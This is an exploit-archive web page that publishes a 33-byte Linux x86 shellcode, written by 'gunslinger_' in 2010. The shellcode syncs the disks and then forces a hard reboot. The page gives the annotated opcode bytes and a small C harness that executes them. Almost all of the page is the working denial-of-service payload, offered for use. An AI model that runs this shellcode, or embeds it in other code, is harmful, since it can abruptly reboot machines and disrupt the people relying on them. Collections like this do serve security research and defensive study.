<html><head><title>Linux/x86 - hard reboot (without any message) and data not lost - 33 bytes</title>
<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1" />
<meta http-equiv="Content-Language" content="en" />
</head>


<pre>
/*
1-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=0
0     _                   __           __       __                     1
1   /' \            __  /'__`\        /\ \__  /'__`\                   0
0  /\_, \    ___   /\_\/\_\ \ \    ___\ \ ,_\/\ \/\ \  _ ___           1
1  \/_/\ \ /' _ `\ \/\ \/_/_\_&lt;_  /'___\ \ \/\ \ \ \ \/\`'__\          0
0     \ \ \/\ \/\ \ \ \ \/\ \ \ \/\ \__/\ \ \_\ \ \_\ \ \ \/           1
1      \ \_\ \_\ \_\_\ \ \ \____/\ \____\\ \__\\ \____/\ \_\           0
0       \/_/\/_/\/_/\ \_\ \/___/  \/____/ \/__/ \/___/  \/_/           1
1                  \ \____/ &gt;&gt; Exploit database separated by exploit   0
0                   \/___/          type (local, remote, DoS, etc.)    1
1                                                                      1
0  [+] Site            : Inj3ct0r.com                                  0
1  [+] Support e-mail  : submit[at]inj3ct0r.com                        1
0                                                                      0
0-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-==-=-=-1
Title  : hard reboot (without any message) and data not lost shellcode
Name   : 33 bytes hard / unclean reboot but data not be lost x86 linux shellcode 
Date   : Thu Jun  3 12:54:55 2010
Author : gunslinger_ &lt;yudha.gunslinger[at]gmail.com&gt;
Web    : http://devilzc0de.org
blog   : http://gunslingerc0de.wordpress.com
tested on : linux ubuntu 9.04 , may cause fsck on reboot
special thanks to : r0073r (inj3ct0r.com), d3hydr8 (darkc0de.com), ty miller (projectshellcode.com), jonathan salwan(shell-storm.org), mywisdom (devilzc0de.org)
greetz to : flyff666, whitehat, ketek, chaer, peneter, and all devilzc0de crew
*/
#include &lt;stdio.h&gt;

char *shellcode=
		&quot;\xb0\x24&quot;                    /* mov    $0x24,%al */
		&quot;\xcd\x80&quot;                    /* int    $0x80 */
		&quot;\x31\xc0&quot;                    /* xor    %eax,%eax */
		&quot;\xb0\x58&quot;                    /* mov    $0x58,%al */
		&quot;\xbb\xad\xde\xe1\xfe&quot;        /* mov    $0xfee1dead,%ebx */
		&quot;\xb9\x69\x19\x12\x28&quot;        /* mov    $0x28121969,%ecx */
		&quot;\xba\x67\x45\x23\x01&quot;        /* mov    $0x1234567,%edx */
		&quot;\xcd\x80&quot;                    /* int    $0x80 */
		&quot;\x31\xc0&quot;                    /* xor    %eax,%eax */
		&quot;\xb0\x01&quot;                    /* mov    $0x1,%al */
		&quot;\x31\xdb&quot;                    /* xor    %ebx,%ebx */
		&quot;\xcd\x80&quot;;                   /* int    $0x80 */

int main(void)
{
		fprintf(stdout,&quot;Length: %d\n&quot;,strlen(shellcode));
		((void (*)(void)) shellcode)();
		return 0;
}


<body><script type="text/javascript">
var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
document.write(unescape("%3Cscript src=%27" + gaJsHost + "google-analytics.com/ga.js%27 type=%27text/javascript%27%3E%3C/script%3E"));
</script>

<script type="text/javascript">
try {
var pageTracker = _gat._getTracker("UA-6809519-1");
pageTracker._trackPageview();
} catch(err) {}</script></body></html>
